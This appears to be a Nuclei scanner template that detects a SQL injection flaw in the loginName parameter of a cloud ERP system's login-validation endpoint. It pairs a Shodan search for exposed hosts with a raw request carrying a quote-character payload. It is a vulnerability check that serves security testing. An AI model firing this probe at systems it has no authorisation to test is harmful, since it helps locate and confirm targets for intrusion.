id: Cloud_pace-time_Elprokinamshi_SQLi

info:
  name: Cloud_pace-time_Elprokinamshi_SQLi
  author: HK
  severity: high
  description: LoginName SQL injection of cloud spatio-temporal social business ERP system
  metadata:
    max-request: 1
    shodan-query: body="/static/images/yunlogo_home.png"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /sys/user/validateLoginName?loginName=admin' HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

  redirects: true
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - sql